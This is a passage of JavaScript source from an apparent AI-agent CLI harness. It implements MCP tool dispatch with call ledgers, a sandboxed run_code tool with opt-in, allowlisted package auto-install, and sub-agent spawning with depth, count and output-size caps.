            ).slice(0, 128),
            retryable:
              error?.code === "TEAM_MESSAGE_BRIDGE_TIMEOUT" ||
              Number.isSafeInteger(error?.retryAfterMs),
            ...(Number.isSafeInteger(error?.retryAfterMs)
              ? { retryAfterMs: error.retryAfterMs }
              : {}),
          });
        }
      }

      if (localToolExecutor?.kind === "mcp") {
        if (!mcpClient || typeof mcpClient.callTool !== "function") {
          return attachDescriptor({
            error: `MCP client is unavailable for tool: ${name}`,
          });
        }

        // Deferred-schema gate: a direct call to a tool whose schema was never
        // loaded returns a self-healing error embedding the schema (and marks
        // it loaded), instead of forwarding likely-malformed arguments to the
        // server. No-op unless tool search deferred this tool.
        const deferredGate = gateDeferredMcpCall(name, localToolExecutor);
        if (deferredGate) {
          return attachDescriptor(deferredGate);
        }

        // executeTool admitted this immutable snapshot before permission and
        // Hook processing; reuse the exact object for ledger and transport.
        const mcpWireInput = args;

        if (
          mcpDispatchAdmission !== null &&
          typeof mcpDispatchAdmission !== "function"
        ) {
          return attachDescriptor({
            error:
              "MCP tool blocked because the host dispatch authority is invalid",
            policy: {
              decision: "blocked",
              via: "mcp-dispatch-admission",
              code: "CC_MCP_DISPATCH_ADMISSION_INVALID",
            },
          });
        }

        const schedulerScopes = mcpLedgerScopes(mcpWireInput);
        const ledgerEffectContract = mcpLedgerEffectContract(
          localToolDescriptor,
          hostToolPolicy,
        );
        const schedulerEffectContract = ledgerEffectContract.trusted
          ? createHostOwnedMcpEffectContract(ledgerEffectContract)
          : ledgerEffectContract;
        const scheduler =
          mcpConflictScheduler || directMcpConflictScheduler(mcpClient);
        let schedulerLease;
        try {
          schedulerLease = await scheduler.acquire(
            {
              effectContract: schedulerEffectContract,
              ...schedulerScopes,
            },
            { signal },
          );
        } catch (err) {
          return attachDescriptor({
            error: `MCP tool blocked by the effect conflict scheduler: ${err.message}`,
            policy: {
              decision: "blocked",
              via: "mcp-conflict-scheduler",
              code: err?.code || null,
            },
          });
        }

        try {
          const ledger = mcpCallLedger || createMcpCallLedger();
          let ledgerTicket;
          try {
            ledgerTicket = await ledger.begin({
              sessionId,
              turnId,
              ...(workflowEffectId
                ? {
                    workflowEffectId,
                    workflowChildEffectId,
                    workflowChildSequence,
                    workflowEffectProtocol,
                  }
                : {}),
              toolName: localToolExecutor.toolName,
              serverName: localToolExecutor.serverName,
              input: mcpWireInput,
              effectContract: ledgerEffectContract,
              ...schedulerScopes,
            });
          } catch (err) {
            return attachDescriptor({
              error: `MCP tool blocked because its call ledger prewrite failed: ${err.message}`,
              policy: {
                decision: "blocked",
                via: "mcp-ledger-prewrite",
                code: err?.code || null,
                ledgerId: err?.ledgerId || null,
                effect: err?.effect || null,
                blockMode: err?.blockMode || null,
              },
            });
          }

          const transportFailure = async (callError, phase = "call") => {
            const definitiveRpcFailure = isMcpRpcError(callError);
            const definitelyNotDispatched =
              safeMcpProperty(callError, "dispatched") === false;
            if (
              mcpTransportOutcomeIsUnsafe(ledgerEffectContract) &&
              !definitiveRpcFailure &&
              !definitelyNotDispatched
            ) {
              const resultAdmissionFailure =
                isMcpToolResultAdmissionError(callError);
              return attachDescriptor(
                mcpOutcomeUnknownPayload(ledger, ledgerTicket, {
                  phase,
                  reasonCode: resultAdmissionFailure
                    ? safeMcpErrorCode(
                        callError,
                        MCP_PROTOCOL_RESULT_INVALID_CODE,
                      )
                    : MCP_TRANSPORT_OUTCOME_UNKNOWN_CODE,
                }),
              );
            }
            const projectedError = projectMcpCallError(callError);
            try {
              await ledgerTicket.settle({
                status: "failed",
                error: projectedError,
              });
            } catch (ledgerError) {
              return attachDescriptor(
                mcpOutcomeUnknownPayload(ledger, ledgerTicket, {
                  phase: "settled",
                  reasonCode: safeMcpErrorCode(
                    ledgerError,
                    "CC_MCP_LEDGER_SETTLE_FAILED",
                  ),
                }),
              );
            }
            return attachDescriptor({
              error: `MCP tool execution failed: ${projectedError.message}`,
              mcpLedgerId: safeMcpProperty(ledgerTicket, "ledgerId") || null,
            });
          };

          let pendingResult;
          try {
            const callArguments = [
              localToolExecutor.serverName,
              localToolExecutor.toolName,
              mcpWireInput,
            ];
            if (signal || mcpDispatchAdmission || workflowEffectId) {
              callArguments.push({
                ...(signal ? { signal } : {}),
                ...(mcpDispatchAdmission
                  ? { dispatchAdmission: mcpDispatchAdmission }
                  : {}),
                ...(workflowEffectId
                  ? {
                      workflowEffectId,
                      workflowChildEffectId,
                      workflowChildSequence,
                      workflowEffectProtocol,
                    }
                  : {}),
              });
            }
            pendingResult = Reflect.apply(
              mcpClient.callTool,
              mcpClient,
              callArguments,
            );
          } catch (callError) {
            return await transportFailure(
              callError,
              isMcpToolResultAdmissionError(callError) ? "result" : "call",
            );
          }

          let result;
          if (
            pendingResult !== null &&
            (typeof pendingResult === "object" ||
              typeof pendingResult === "function")
          ) {
            if (isProxy(pendingResult)) {
              return attachDescriptor(
                mcpOutcomeUnknownPayload(ledger, ledgerTicket, {
                  phase: "result",
                  reasonCode: MCP_PROTOCOL_RESULT_INVALID_CODE,
                }),
              );
            }

            let nativePromise;
            try {
              nativePromise = pendingResult instanceof Promise;
            } catch (inspectionError) {
              return attachDescriptor(
                mcpOutcomeUnknownPayload(ledger, ledgerTicket, {
                  phase: "result",
                  reasonCode: safeMcpErrorCode(
                    invalidMcpProtocolResult(inspectionError),
                    MCP_PROTOCOL_RESULT_INVALID_CODE,
                  ),
                }),
              );
            }

            if (nativePromise) {
              try {
                result = await pendingResult;
              } catch (callError) {
                return await transportFailure(
                  callError,
                  isMcpToolResultAdmissionError(callError) ? "result" : "call",
                );
              }
            } else {
              let then;
              try {
                then = Reflect.get(pendingResult, "then", pendingResult);
              } catch (inspectionError) {
                return attachDescriptor(
                  mcpOutcomeUnknownPayload(ledger, ledgerTicket, {
                    phase: "result",
                    reasonCode: safeMcpErrorCode(
                      invalidMcpProtocolResult(inspectionError),
                      MCP_PROTOCOL_RESULT_INVALID_CODE,
                    ),
                  }),
                );
              }
              if (typeof then === "function") {
                try {
                  result = await new Promise((resolve, reject) => {
                    try {
                      Reflect.apply(then, pendingResult, [resolve, reject]);
                    } catch (thenError) {
                      reject(thenError);
                    }
                  });
                } catch (thenError) {
                  return attachDescriptor(
                    mcpOutcomeUnknownPayload(ledger, ledgerTicket, {
                      phase: "result",
                      reasonCode: safeMcpErrorCode(
                        invalidMcpProtocolResult(thenError),
                        MCP_PROTOCOL_RESULT_INVALID_CODE,
                      ),
                    }),
                  );
                }
              } else {
                result = pendingResult;
              }
            }
          } else {
            result = pendingResult;
          }

          try {
            result = admitMcpToolResult(
              localToolExecutor.serverName,
              result,
              localToolExecutor.toolResultConfig,
            ).result;
          } catch (resultError) {
            return await transportFailure(resultError, "result");
          }

          let protocolError;
          try {
            if (
              result !== null &&
              (typeof result === "object" || typeof result === "function") &&
              isProxy(result)
            ) {
              throw invalidMcpProtocolResult();
            }
            protocolError = result?.isError === true;
          } catch (inspectionError) {
            return attachDescriptor(
              mcpOutcomeUnknownPayload(ledger, ledgerTicket, {
                phase: "result",
                reasonCode: safeMcpErrorCode(
                  invalidMcpProtocolResult(inspectionError),
                  MCP_PROTOCOL_RESULT_INVALID_CODE,
                ),
              }),
            );
          }

          let settledLedgerRecord;
          try {
            settledLedgerRecord = await ledgerTicket.settle(
              protocolError
                ? {
                    status: "failed",
                    output: result,
                    error: new Error("MCP server returned isError=true"),
                  }
                : { status: "completed", output: result },
            );
          } catch (ledgerError) {
            return attachDescriptor(
              mcpOutcomeUnknownPayload(ledger, ledgerTicket, {
                phase: "settled",
                reasonCode: safeMcpErrorCode(
                  ledgerError,
                  "CC_MCP_LEDGER_SETTLE_FAILED",
                ),
              }),
            );
          }

          const mcpLedgerId = safeMcpProperty(ledgerTicket, "ledgerId") || null;
          const mcpLedgerPrewritePersisted =
            safeMcpProperty(ledgerTicket, "prewritePersisted") === true;
          const mcpLedgerSettlementPersisted =
            safeMcpProperty(settledLedgerRecord, "settlementPersistence") ===
            "persisted";
          try {
            if (result && typeof result === "object") {
              return attachDescriptor({
                ...result,
                mcpLedgerId,
                mcpLedgerPrewritePersisted,
                mcpLedgerSettlementPersisted,
              });
            }
            return attachDescriptor({
              result,
              mcpLedgerId,
              mcpLedgerPrewritePersisted,
              mcpLedgerSettlementPersisted,
            });
          } catch (projectionError) {
            return attachDescriptor({
              error:
                "MCP tool completed, but its result could not be projected safely; do not retry automatically.",
              code: MCP_RESULT_PROJECTION_FAILED_CODE,
              retryable: false,
              mcpLedgerId,
              mcpLedgerIncident: {
                phase: "result",
                code: safeMcpErrorCode(
                  projectionError,
                  MCP_RESULT_PROJECTION_FAILED_CODE,
                ),
              },
            });
          }
        } finally {
          schedulerLease.release();
        }
      }

      if (
        hostToolDefinition &&
        interaction &&
        typeof interaction.requestHostTool === "function"
      ) {
        const hostedResult = workflowEffectId
          ? await interaction.requestHostTool(
              name,
              args,
              Object.freeze({
                workflowEffectId,
                workflowChildEffectId,
                workflowChildSequence,
                workflowEffectProtocol,
              }),
            )
          : await interaction.requestHostTool(name, args);
        if (hostedResult?.success === false) {
          return attachDescriptor({
            error:
              hostedResult.error || `Hosted tool execution failed: ${name}`,
            policy: hostToolPolicy || null,
          });
        }

        if (hostedResult?.result && typeof hostedResult.result === "object") {
          return hostedResult.result;
        }

        return attachDescriptor({
          result:
            hostedResult &&
            Object.prototype.hasOwnProperty.call(hostedResult, "result")
              ? hostedResult.result
              : hostedResult,
        });
      }

      return attachDescriptor({ error: `Unknown tool: ${name}` });
  }
}

// ─── run_code implementation ──────────────────────────────────────────────

/**
 * Classify an error from code execution into a structured type with hints.
 * @param {string} stderr - stderr output
 * @param {string} message - error message
 * @param {number|null} exitCode - process exit code
 * @param {string} lang - language (python, node, bash)
 * @returns {{ errorType: string, hint: string }}
 */
export function classifyError(stderr, message, exitCode, lang) {
  const text = stderr || message || "";

  // Import / module errors
  if (/ModuleNotFoundError|ImportError|No module named/i.test(text)) {
    const modMatch = text.match(/No module named ['"]([^'"]+)['"]/);
    return {
      errorType: "import_error",
      hint: modMatch
        ? `Missing Python module "${modMatch[1]}". Will attempt auto-install.`
        : "Missing module. Check your imports.",
    };
  }

  // Syntax errors
  if (/SyntaxError|IndentationError|TabError/i.test(text)) {
    const lineMatch = text.match(/line (\d+)/i);
    return {
      errorType: "syntax_error",
      hint: lineMatch
        ? `Syntax error on line ${lineMatch[1]}. Check for typos, missing colons, or indentation.`
        : "Syntax error in code. Check for typos or missing brackets.",
    };
  }

  // Timeout
  if (/ETIMEDOUT|timed?\s*out/i.test(text) || exitCode === null) {
    return {
      errorType: "timeout",
      hint: "Script timed out. Consider increasing timeout or optimizing the code.",
    };
  }

  // Permission errors
  if (/EACCES|Permission denied|PermissionError/i.test(text)) {
    return {
      errorType: "permission_error",
      hint: "Permission denied. Try a different directory or run with appropriate permissions.",
    };
  }

  // Generic runtime error
  const lineMatch = text.match(/(?:line |:)(\d+)/);
  return {
    errorType: "runtime_error",
    hint: lineMatch
      ? `Runtime error near line ${lineMatch[1]}. Check the traceback above.`
      : "Runtime error. Check stderr for details.",
  };
}

/**
 * Validate a package name for pip install (reject shell metacharacters).
 * @param {string} name
 * @returns {boolean}
 */
export function isValidPackageName(name) {
  return /^[a-zA-Z0-9_][a-zA-Z0-9._-]*$/.test(name) && name.length <= 100;
}

/**
 * Execute code with auto pip-install, script persistence, and error classification.
 */
async function _executeRunCode(args, cwd) {
  const lang = args.language;
  const code = args.code;
  const timeoutSec = Math.min(Math.max(args.timeout || 60, 1), 300);
  // gap-analysis 2026-07-11 P0 "依赖安装与凭据": agent-generated scripts
  // default to the OS temp dir; only an explicit persist:true lands them in
  // the project (.chainlesschain/agent-scripts/).
  const persist = args.persist === true; // default false (temp dir)

  const extMap = { python: ".py", node: ".js", bash: ".sh" };
  const ext = extMap[lang];
  if (!ext) {
    return {
      error: `Unsupported language: ${lang}. Use python, node, or bash.`,
    };
  }

  // Every agent-generated interpreter process inherits the tighten-only union
  // of strict Plugin bin boundaries visible from this workspace. Discover and
  // pin it before creating a persistent directory, writing a temporary script,
  // or probing an interpreter so discovery failure cannot fall through to an
  // unbounded native spawn.
  let pluginBinSandboxPolicy = null;
  try {
    const pluginBin = await import("../lib/plugin-runtime/bin.js");
    pluginBinSandboxPolicy = collectWorkspacePluginBinSandboxPolicy(
      pluginBin,
      cwd,
    );
  } catch (error) {
    return {
      error: `[Plugin bin] ${error.message}`,
      policy: {
        decision: "deny",
        via: "plugin-bin-pinned-sandbox-policy",
        reason: error.code || "ERR_PLUGIN_BIN_SANDBOX_POLICY_DISCOVERY_FAILED",
      },
    };
  }
  const pluginBinSandboxOptions = pluginBinSandboxPolicy
    ? { sandboxPolicy: pluginBinSandboxPolicy }
    : {};

  // cli-anything's Python discovery probes candidate executables through its
  // own Broker call. That probe cannot inherit this run_code invocation's
  // pinned Plugin sandbox policy, so never launch it when strict boundaries
  // are required. A previously cached interpreter is safe to execute here
  // because the real script (and any pip/retry process) still goes through
  // runCodeProcess with the exact pinned policy below.
  let cachedPythonInterpreter = null;
  if (
    lang === "python" &&
    pluginBinSandboxPolicy?.requiredBoundaries?.length > 0
  ) {
    if (
      _cachedPython?.found === true &&
      typeof _cachedPython.command === "string" &&
      _cachedPython.command.trim()
    ) {
      cachedPythonInterpreter = _cachedPython.command;
    } else {
      throw createPythonInterpreterProbeSandboxFailure(pluginBinSandboxPolicy);
    }
  }

  // Determine script path
  let scriptPath;
  if (persist) {
    const scriptsDir = path.join(cwd, ".chainlesschain", "agent-scripts");
    if (!fs.existsSync(scriptsDir)) {
      fs.mkdirSync(scriptsDir, { recursive: true });
    }
    const timestamp = new Date()
      .toISOString()
      .replace(/[T:]/g, "-")
      .replace(/\.\d+Z$/, "");
    scriptPath = path.join(scriptsDir, `${timestamp}-${lang}${ext}`);
  } else {
    scriptPath = path.join(os.tmpdir(), `cc-agent-${Date.now()}${ext}`);
  }

  try {
    fs.writeFileSync(scriptPath, code, "utf8");

    // Determine interpreter
    let interpreter;
    if (lang === "python") {
      if (cachedPythonInterpreter) {
        interpreter = cachedPythonInterpreter;
      } else {
        const py = getCachedPython();
        interpreter = py.found ? py.command : "python";
      }
    } else if (lang === "node") {
      interpreter = "node";
    } else {
      interpreter = "bash";
    }

    const start = Date.now();
    let output;
    try {
      output = runCodeProcess(interpreter, [scriptPath], {
        cwd,
        encoding: "utf8",
        timeout: timeoutSec * 1000,
        maxBuffer: 5 * 1024 * 1024,
        ...pluginBinSandboxOptions,
      });
    } catch (err) {
      // Broker boundary errors carry the required/actual/missing guarantees and
      // backend attestation. Preserve that exact structured error for callers
      // instead of flattening it into run_code's generic runtime classifier.
      rethrowRunCodeSandboxFailure(err);
      const stderr = (err.stderr || "").toString();
      const message = err.message || "";
      const classified = classifyError(stderr, message, err.status, lang);

      // Auto-install missing Python packages
      if (lang === "python" && classified.errorType === "import_error") {
        const modMatch = stderr.match(/No module named ['"]([^'"]+)['"]/);
        if (modMatch) {
          // Use top-level package name (e.g. "foo.bar" → "foo")
          const packageName = modMatch[1].split(".")[0];

          if (!isValidPackageName(packageName)) {
            return {
              error: `Invalid package name: "${packageName}"`,
              ...classified,
              language: lang,
              scriptPath: persist ? scriptPath : undefined,
            };
          }

          // Auto-install is OPT-IN (settings runCode.autoInstall / env
          // CC_RUN_CODE_AUTO_INSTALL=1) with an optional package allowlist;
          // every attempt — including refused ones — is audited.
          const {
            resolveAutoInstallPolicy,
            isPackageAllowed,
            autoInstallDisabledHint,
            recordInstallAudit,
          } = await import("../lib/dependency-install-policy.js");
          const installPolicy = resolveAutoInstallPolicy({ cwd });
          if (!installPolicy.enabled) {
            recordInstallAudit({
              package: packageName,
              interpreter,
              cwd,
              outcome: "disabled",
            });
            return {
              error: (stderr || message).substring(0, 5000),
              stderr: stderr.substring(0, 5000),
              exitCode: err.status,
              language: lang,
              ...classified,
              hint: autoInstallDisabledHint(packageName),
              scriptPath: persist ? scriptPath : undefined,
            };
          }
          if (!isPackageAllowed(packageName, installPolicy.allowlist)) {
            recordInstallAudit({
              package: packageName,
              interpreter,
              cwd,
              outcome: "blocked",
            });
            return {
              error: (stderr || message).substring(0, 5000),
              stderr: stderr.substring(0, 5000),
              exitCode: err.status,
              language: lang,
              ...classified,
              hint: `Package "${packageName}" is not in runCode.installAllowlist — install it manually or add it to the allowlist.`,
              scriptPath: persist ? scriptPath : undefined,
            };
          }

          // Unified install-command audit (P0 sandbox slice): the same opt-in
          // trail (CC_INSTALL_AUDIT / settings installPolicy) that records
          // run_shell installs also records run_code auto-installs — one audit
          // file covers every "fetch and run third-party code" entry point.
          // Best-effort; default (policy off) writes nothing.
          let auditUnifiedInstall = () => {};
          try {
            const icp = await import("../lib/install-command-policy.js");
            const unified = icp.resolveInstallPolicy({});
            if (unified.audit) {
              const installCommand = `${interpreter} -m pip install ${packageName}`;
              const cls = icp.classifyInstallCommand(installCommand);
              auditUnifiedInstall = (outcome, detail) =>
                icp.recordInstallCommandAudit({
                  source: "run_code_auto_install",
                  command: installCommand,
                  outcome,
                  ...(detail ? { detail } : {}),
                  installs: cls.installs,
                  global: icp.hasGlobalInstall(cls),
                });
            }
          } catch {
            /* unified audit must never affect the install itself */
          }

          const autoInstallFailure = (installError) => {
            recordInstallAudit({
              package: packageName,
              interpreter,
              cwd,
              outcome: "failed",
              detail: (
                installError.stderr ||
                installError.message ||
                ""
              ).substring(0, 200),
            });
            auditUnifiedInstall(
              "failed",
              (installError.stderr || installError.message || "").substring(
                0,
                200,
              ),
            );
            return {
              error: (stderr || message).substring(0, 5000),
              stderr: stderr.substring(0, 5000),
              exitCode: err.status,
              language: lang,
              ...classified,
              hint: `Failed to auto-install "${packageName}". ${(installError.stderr || installError.message || "").substring(0, 500)}`,
              scriptPath: persist ? scriptPath : undefined,
            };
          };

          // Attempt pip install
          try {
            runCodeProcess(
              interpreter,
              ["-m", "pip", "install", packageName],
              {
                cwd,
                encoding: "utf-8",
                timeout: 120000,
                maxBuffer: 2 * 1024 * 1024,
                stdio: ["pipe", "pipe", "pipe"],
                ...pluginBinSandboxOptions,
              },
              "run-code-install",
            );
          } catch (pipErr) {
            const failure = autoInstallFailure(pipErr);
            rethrowRunCodeSandboxFailure(pipErr);
            return failure;
          }
          recordInstallAudit({
            package: packageName,
            interpreter,
            cwd,
            outcome: "installed",
          });
          auditUnifiedInstall("installed");

          // Keep retry separate from the install catch: either Broker call can
          // carry an independently attested fail-closed boundary error, and
          // neither may be flattened into the legacy auto-install result.
          try {
            const retryStart = Date.now();
            const retryOutput = runCodeProcess(
              interpreter,
              [scriptPath],
              {
                cwd,
                encoding: "utf8",
                timeout: timeoutSec * 1000,
                maxBuffer: 5 * 1024 * 1024,
                ...pluginBinSandboxOptions,
              },
              "run-code-retry",
            );
            const retryDuration = Date.now() - retryStart;

            return {
              success: true,
              output: retryOutput.substring(0, 50000),
              language: lang,
              duration: `${retryDuration}ms`,
              autoInstalled: [packageName],
              scriptPath: persist ? scriptPath : undefined,
            };
          } catch (retryErr) {
            rethrowRunCodeSandboxFailure(retryErr);
            const retryStderr = (retryErr.stderr || "").toString();
            const retryMessage = retryErr.message || "";
            const retryClassified = classifyError(
              retryStderr,
              retryMessage,
              retryErr.status,
              lang,
            );
            return {
              error: (retryStderr || retryMessage).substring(0, 5000),
              stderr: retryStderr.substring(0, 5000),
              exitCode: retryErr.status,
              language: lang,
              ...retryClassified,
              hint: `Package "${packageName}" was installed, but the script retry failed.`,
              autoInstalled: [packageName],
              scriptPath: persist ? scriptPath : undefined,
            };
          }
        }
      }

      return {
        error: (stderr || message).substring(0, 5000),
        stderr: stderr.substring(0, 5000),
        exitCode: err.status,
        language: lang,
        ...classified,
        scriptPath: persist ? scriptPath : undefined,
      };
    }

    const duration = Date.now() - start;
    return {
      success: true,
      output: output.substring(0, 50000),
      language: lang,
      duration: `${duration}ms`,
      scriptPath: persist ? scriptPath : undefined,
    };
  } finally {
    // Only clean up if not persisting
    if (!persist) {
      try {
        fs.unlinkSync(scriptPath);
      } catch {
        // Cleanup best-effort
      }
    }
  }
}

// ─── spawn_sub_agent implementation ──────────────────────────────────────

/**
 * Max sub-agent nesting depth (Claude-Code 2.1.172 parity: sub-agents may
 * spawn their own sub-agents, capped at 5 levels so a runaway model cannot
 * recurse forever). Main loop = depth 0, its children = 1, …
 */
export const MAX_SUB_AGENT_DEPTH = 5;

/**
 * Max TOTAL sub-agents a single run may spawn across the whole tree. The depth
 * cap bounds how DEEP nesting goes (5), but not how WIDE: every level could fan
 * out many children, each with its own fresh iteration budget, so depth-cap
 * alone leaves total work ~budget^depth in a runaway/adversarial case. A shared
 * counter (threaded by reference through the tool context, like subAgentDepth)
 * gives a hard ceiling on the whole tree. Generous enough for legitimate
 * fan-out delegation; a model that blows past it is looping. Override per run
 * with `options.subAgentBudget`.
 */
export const MAX_SUB_AGENTS_PER_RUN = 32;

/**
 * Per-tool-result character cap fed back to the model. One giant tool output (a
 * huge file, a verbose command, an MCP blob) must not blow the context window —
 * but the model is TOLD when output is cut, instead of the old silent
 * `substring(0, 5000)` that sliced mid-content with no marker and undercut even
 * read_file's own 50k self-limit. Tools that self-limit (read_file, notebook
 * render) stay below this; it is the final safety net for the ones that don't
 * (run_shell, search_files, run_code, MCP). CC_MAX_TOOL_RESULT_CHARS may only
 * tighten the host ceiling; it cannot raise or disable it.
 */
export const MAX_TOOL_RESULT_CHARS_HARD_LIMIT = 50000;

export function resolveMaxToolResultChars(configured) {
  const value = Number(configured);
  return Number.isFinite(value) && value > 0
    ? Math.min(MAX_TOOL_RESULT_CHARS_HARD_LIMIT, Math.max(1, Math.floor(value)))
    : MAX_TOOL_RESULT_CHARS_HARD_LIMIT;
}

export const MAX_TOOL_RESULT_CHARS = resolveMaxToolResultChars(
  process.env.CC_MAX_TOOL_RESULT_CHARS,
);

/**
 * Cap a serialized tool result to `max` chars, appending a visible truncation
 * marker (with the original length + how to get the rest) when it overflows —
 * so the model never silently receives a mid-content slice. Pure; exported for
 * tests.
 */
export function capToolResultString(serialized, max = MAX_TOOL_RESULT_CHARS) {
  const s = String(serialized ?? "");
  const effectiveMax = resolveMaxToolResultChars(max);
  if (s.length <= effectiveMax) return s;
  return (
    s.slice(0, effectiveMax) +
    `\n…[tool output truncated: showing the first ${effectiveMax} of ${s.length} chars` +
    ` — narrow the request (read a line range, grep, or paginate) to see the rest]`
  );
}

/**
 * Serialize a tool result for the transcript without ever throwing. A plain
 * `JSON.stringify` throws on a circular reference, a BigInt, or a value whose
 * `toJSON` throws — and that call sits OUTSIDE executeTool's try/catch, so one
 * odd tool result would crash the whole agent turn. The happy path is identical
 * to `JSON.stringify` (returns its value verbatim, including `undefined`, which
 * `capToolResultString` already normalizes); only a throw falls back to a
 * circular- and BigInt-safe pass, then a last-resort string form.
 */
export function safeStringifyToolResult(value) {
  try {
    return JSON.stringify(value);
  } catch {
    try {
      const seen = new WeakSet();
      return JSON.stringify(value, (_k, v) => {
        if (typeof v === "bigint") return v.toString();
        if (v && typeof v === "object") {
          if (seen.has(v)) return "[Circular]";
          seen.add(v);
        }
        return v;
      });
    } catch {
      try {
        return String(value);
      } catch {
        return "[unserializable tool result]";
      }
    }
  }
}

export function emitToolHookLifecycle({
  tool,
  args,
  result,
  error = null,
  sessionId = null,
  turnId = null,
  toolUseId = null,
  cwd = process.cwd(),
  emit = emitHooksV2Event,
}) {
  const failed = Boolean(error || result?.error);
  const base = {
    schema_version: 1,
    session_id: sessionId,
    turn_id: turnId,
    tool_use_id: toolUseId,
    tool_name: tool,
    duration_ms: Number(result?.toolTelemetryRecord?.durationMs || 0),
    cwd,
  };
  emit(failed ? "PostToolUseFailure" : "PostToolUse", {
    ...base,
    ...(failed
      ? {
          error_code:
            result?.error?.code ||
            result?.code ||
            (typeof error === "object" ? error?.code : null) ||
            "tool_error",
        }
      : {}),
  });
  if (!failed && GUARDED_FILE_MUTATION_TOOLS.has(tool)) {
    const changedPath =
      args?.path ||
      args?.filePath ||
      args?.file_path ||
      args?.targetPath ||
      args?.target_path ||
      null;
    emit("FileChanged", {
      ...base,
      path: changedPath == null ? null : String(changedPath),
      operation: tool,
    });
  }
  return failed;
}

export function emitToolBatchHookLifecycle({
  records = [],
  sessionId = null,
  turnId = null,
  cwd = process.cwd(),
  parallel = false,
  emit = emitHooksV2Event,
}) {
  if (!Array.isArray(records) || records.length === 0) return null;
  const failed = records.filter((record) => record?.failed === true).length;
  const payload = {
    schema_version: 1,
    session_id: sessionId,
    turn_id: turnId,
    cwd,
    parallel: parallel === true,
    total: records.length,
    succeeded: records.length - failed,
    failed,
    tool_names: records.map((record) => record?.tool || "(unknown)"),
    tool_use_ids: records.map((record) => record?.toolUseId || null),
  };
  emit("PostToolBatch", payload);
  return payload;
}

/**
 * Execute a spawn_sub_agent tool call.
 * Creates an isolated SubAgentContext, runs it, and returns only the summary.
 *
 * @param {object} args - { role, task, context?, tools? }
 * @param {object} ctx - { skillLoader, cwd, parentMessages, interaction, sessionId }
 * @returns {Promise<object>}
 */
/**
 * Remove and return every SETTLED background sub-agent entry from the run's
 * map. Called by agentLoop before each LLM call (deliver fresh results) and
 * after the end-of-run wait (deliver stragglers).
 */
function _takeSettledBackgroundSubAgents(map) {
  const done = [];
  for (const [id, entry] of map) {
    if (entry.settled) {
      done.push(entry);
      map.delete(id);
    }
  }
  return done;
}

/**
 * Render a settled background sub-agent's outcome as the user-role message
 * injected into the parent conversation (the only channel that reaches the
 * model between turns — there is no open tool_call to attach a result to).
 */
function _backgroundSubAgentResultText(entry) {
  const o = entry.outcome || {};
  const status = o.error ? "FAILED" : "completed";
  const summary =
    (o.result && o.result.summary) || o.error || "(no output from sub-agent)";
  const tools =
    o.result && Array.isArray(o.result.toolsUsed) && o.result.toolsUsed.length
      ? `\nTools used: ${o.result.toolsUsed.join(", ")}`
      : "";
  const feedback = entry.hookFeedback
    ? `\nHook feedback: ${entry.hookFeedback}`
    : "";
  return (
    `[Background sub-agent "${entry.role}" (${entry.id}) ${status}]\n` +
    `Task: ${entry.task}\n` +
    `Result:\n${summary}${tools}${feedback}`
  );
}

function _throwBackgroundSubAgentUsageFailure(entry) {
  const error = entry?.outcome?.fatalError;
  if (
    error?.runtimeLedgerPersistence === true ||
    error?.workflowEffectOutcomeUnknown === true
  ) {
    throw error;
  }
}

function _throwSettledBackgroundUsageFailure(map) {
  if (!(map instanceof Map)) return;
  for (const entry of map.values()) {
    if (entry?.settled === true) {
      _throwBackgroundSubAgentUsageFailure(entry);
    }
  }
}

function _throwBackgroundUsageFailureState(state) {
  const error = state?.error;
  if (error?.runtimeLedgerPersistence === true) throw error;
}

async function _awaitBackgroundUsageSettlement(map, state) {
  _throwBackgroundUsageFailureState(state);
  if (map instanceof Map && map.size > 0) {
    await Promise.all([...map.values()].map((entry) => entry.promise));
  }
  _throwBackgroundUsageFailureState(state);
  _throwSettledBackgroundUsageFailure(map);
}

/**
 * Drain the run's attributed child-loop usage sink (spawn_sub_agent /
 * isolated run_skill — see toolContext.subAgentUsageSink), re-yielding each
 * record as a regular `token-usage` event that carries its `attribution`
 * frame. Consumers that ignore `attribution` see ordinary usage events;
 * attribution-aware consumers (REPL persistence, headless runner) can split
 * child spend from the main conversation's.
 */
function* _drainSubAgentUsage(sink) {
  while (Array.isArray(sink) && sink.length > 0) {
    const u = sink.shift();
    if (u?.type === "model-usage-unknown") {
      const boundary = {
        callId: u.callId,
        provider: u.provider ?? null,
        model: u.model ?? null,
        source: u.source || "subagent",
        attribution: u.attribution || null,
      };
      if (u.callId && u.boundaryNotified !== true) {
        yield { type: "model-usage-started", ...boundary };
      }
      yield {
        type: "model-usage-unknown",
        ...boundary,
        code: u.code || "provider_transport_outcome_unknown",
        ...(u.ledgerPersisted === true ? { ledgerPersisted: true } : {}),
      };
      continue;
    }
    if (u?.callId && u.boundaryNotified !== true) {
      yield {
        type: "model-usage-started",
        callId: u.callId,
        provider: u.provider ?? null,
        model: u.model ?? null,
        source: u.source || "subagent",
        attribution: u.attribution || null,
      };
    }
    yield {
      type: "token-usage",
      ...(u?.callId ? { callId: u.callId } : {}),
      provider: u?.provider ?? null,
      model: u?.model ?? null,
      usage: u?.usage || {},
      ...(u?.source
        ? { source: u.source }
        : u?.callId
          ? { source: "subagent" }
          : {}),
      attribution: u?.attribution || null,
      ...(u?.ledgerPersisted === true ? { ledgerPersisted: true } : {}),
    };
  }
}

/**
 * Build the bounded, deterministic parent-to-child handoff used when callers
 * do not supply explicit context. Keeping the same nine-field schema as
 * semantic compaction prevents decisions, tests, and unresolved side effects
 * from disappearing merely because work crosses a sub-agent boundary.
 */
export function buildSubAgentHandoffContext(messages) {
  if (!Array.isArray(messages)) return null;
  const canonicalMessages = projectCanonicalResumeMessages(messages);
  const hasContent = canonicalMessages.some((message) => {
    if (!message || !["user", "assistant", "tool"].includes(message.role)) {
      return false;
    }
    if (typeof message.content === "string") {
      return message.content.trim().length > 0;
    }
    return message.content != null;
  });
  if (!hasContent) return null;

  const handoff = buildExtractiveHandoff(canonicalMessages, {
    maxContentChars: 6000,
    maxItemsPerField: 6,
    maxItemChars: 500,
    maxFallbackSourceChars: 16000,
  });
  return `[Structured parent handoff v1]\n${formatStructuredHandoff(handoff)}`;
}

async function _executeSpawnSubAgent(args, ctx) {
  // Nesting cap: refuse before any context/registry work.
  const currentDepth = ctx.subAgentDepth || 0;
  if (currentDepth >= MAX_SUB_AGENT_DEPTH) {
    return {
      error: `spawn_sub_agent: max nesting depth (${MAX_SUB_AGENT_DEPTH}) reached — complete the task directly instead of delegating further.`,
    };
  }
  // Contract-aware recursion tightening: a parent's EFFECTIVE contract can only
  // LOWER the absolute hard caps (fail-closed, tighten-only). Evaluated before
